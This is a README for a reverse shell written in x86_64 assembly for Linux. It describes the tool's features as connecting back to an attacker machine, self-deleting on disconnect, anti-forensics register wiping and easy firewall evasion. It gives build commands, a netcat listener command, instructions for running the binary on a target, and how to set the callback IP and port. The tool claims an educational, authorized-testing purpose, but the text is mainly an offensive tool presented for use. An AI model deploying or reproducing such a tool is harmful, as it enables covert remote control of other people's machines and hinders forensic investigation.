# reverse_shell_on_asm
# Reverse Shell in x86_64 Assembly

A lightweight reverse shell written entirely in x86_64 Assembly for Linux systems. Created for educational purposes and authorized penetration testing.

## üöÄ Features

- **Pure x86_64 Assembly** - No external dependencies
- **TCP Reverse Shell** - Connects back to attacker machine
- **Stream Redirection** - stdin, stdout, stderr redirected to socket
- **Self-Destruct Mechanism** - Automatically removes itself on disconnect
- **Anti-Forensics** - Register wiping and trace cleaning
- **Small Footprint** - Optimized for minimal size
- **Firewall Evasion Ready** - Easy to modify for IP/port rotation

## üîß Building

### Prerequisites
- NASM (Netwide Assembler)
- Linux x86_64 system

### Compilation
```bash
make
Or manually:

bash
nasm -f elf64 my_reverse_shell.asm
ld -o reverse_shell my_reverse_shell.o
üéØ Usage
Start listener on attacker machine:

bash
nc -lvnp 4444
Execute shell on target machine:

bash
./my_reverse_shell
Interactive shell will be available in your netcat session.



‚öôÔ∏è Configuration
Modify IP and Port
Edit my_reverse_shell.asm:

asm
; Change IP (network byte order)
dd 0x7F000001    ; 127.0.0.1 -> replace with target IP

; Change port (network byte order)  
dw 0x5C11        ; 4444 -> replace with target port
Network Byte Order Examples
IP 192.168.1.1 = 0x0101A8C0

Port 1337 = 0x3905



üõ°Ô∏è Technical Details
System Calls Used
sys_socket (41) - Create socket

sys_connect (42) - Connect to remote host

sys_dup2 (33) - Redirect file descriptors

sys_execve (59) - Execute /bin/bash

sys_unlink (87) - Self-destruct

sys_exit (60) - Clean exit

Anti-Forensics Features
Complete register wiping before exit

Automatic file deletion on disconnect

No environment variables passed to execve

Minimal system trace left behind
